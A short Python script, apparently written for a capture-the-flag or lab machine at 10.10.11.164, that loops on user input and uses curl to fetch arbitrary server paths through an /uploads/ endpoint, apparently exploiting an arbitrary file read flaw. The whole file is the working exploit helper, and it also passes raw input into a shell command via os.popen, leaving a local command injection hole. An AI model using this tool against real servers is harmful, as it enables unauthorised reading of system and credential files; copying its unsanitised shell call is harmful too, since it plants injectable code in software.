from os import popen
import readline

url = 'http://10.10.11.164'


def readfile(abs_path):
    abs_path = abs_path.replace('/', '%2F')
    res = popen(
        f'curl {url}/uploads/{abs_path} 2>/dev/null').read().strip()
    print(res)
    return res


while True:
    f = input('> ')
    readfile(f)
